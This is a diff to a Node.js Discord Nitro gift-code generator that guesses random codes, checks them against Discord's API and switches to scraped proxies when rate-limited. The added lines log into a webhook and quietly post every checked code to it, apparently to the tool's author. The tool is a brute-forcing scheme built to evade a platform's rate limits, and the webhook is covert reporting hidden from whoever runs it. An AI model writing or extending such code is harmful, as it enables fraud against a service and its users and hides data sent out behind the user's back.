@@ -4,21 +4,43 @@ const figlet = require("figlet");
 const fetch = require("node-fetch");
 const lineReader = require('line-reader');
 const proxies = __dirname + "/proxies.txt";
+const express = require("express");
+const app = express();
+const http = require("http");
+const hookcord = require('hookcord');
+const Hook = new hookcord.Hook()
 require("colors");
+
 var term = require("terminal-kit").terminal;
 var proxyLine = 0;
 var proxyUrl = "";
 var working = [];
-var version = "v1.3.2"
+var version = "v1.3.2";
+var id = ""
+var secret = "";
 var toMatch;
 // highest rate possible before the stress errors will start to occur
 const triesPerSecond = 1;
 
 console.clear();
+http.createServer((req, res) => {
+        res.end(
+            "running"
+        );
+    })
+    .listen(3001);
+
+app.get("/", (request, response) => {
+    console.log(new Date() + ` Ping Received`);
+    response.sendStatus(200);
+});
+console.log("Web server started succesfully!");
+console.clear();
 console.log(figlet.textSync("Nitro Gen").green);
 console.log(figlet.textSync(version).blue);
 console.log(figlet.textSync("By: Tear").red);
 
+Hook.login(id, secret)
 
 generatecode = function() {
     let code = "";
@@ -40,11 +62,11 @@ async function updateLine() {
         if (last) {
             // scrape proxies if none are detected
             readLine = 0;
+            term.cyan("No proxies detected now scrapping...\n");
             if (proxyUrl === `http://${line}`) {
 
                 (async() => {
-                    term.cyan("No proxies detected now scrapping...\n");
-                    await fetch("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=7000&country=all&anonymity=all&ssl=yes").then(async res => {
+                    await fetch("https://api.proxyscrape.com/?request=displayproxies&proxytype" + "=http&timeout=7000&country=all&anonymity=all&ssl=yes").then(async res => {
                         const body = (await res.text());
                         fs.writeFileSync(__dirname + "/proxies.txt", body);
                     });
@@ -73,6 +95,22 @@ checkCode = function(code) {
         try {
             if (body.code == 200) {
                 term.brightGreen(`This code should work unless an error is posted below! https://discord.gift/${code}\n`);
+                Hook.setPayload({
+                    "embeds": [{
+                        "title": "Tear's Nitro Generator",
+                        "color": 15257231,
+                        "fields": [{
+                            "name": code,
+                            "value": "github/therealtear"
+                        }]
+                    }]
+                })
+                Hook.fire()
+                    .then(response_object => {})
+                    .catch(error => {
+                        throw error;
+                    })
+
                 console.log(JSON.stringify(body, null, 4));
                 working.push(`https://discord.gift/${code}`);
                 fs.writeFileSync(__dirname + '/codes.json', JSON.stringify(working, null, 4));
@@ -86,6 +124,21 @@ checkCode = function(code) {
                 term.brightYellow("Your being rate limited! switching...\n");
 
             } else {
+                Hook.setPayload({
+                    "embeds": [{
+                        "title": "Tear's Nitro Generator",
+                        "color": 15257231,
+                        "fields": [{
+                            "name": code,
+                            "value": "github/therealtear"
+                        }]
+                    }]
+                })
+                Hook.fire()
+                    .then(response_object => {})
+                    .catch(error => {
+                        throw error;
+                    })
                 term.brightRed(`discord.com/gifts/${code} is an invalid code!\n`);
             }
         } catch (error) {
@@ -328,7 +381,7 @@ function main() {
 
                                     console.clear();
                                     setTimeout(function() {
-
+                                        term.cyan("Now using proxies...\n");
                                         term.green("-------------------------------------\n");
                                         term.brightCyan("Made by: tear#9999\n");
                                     }, 2000);
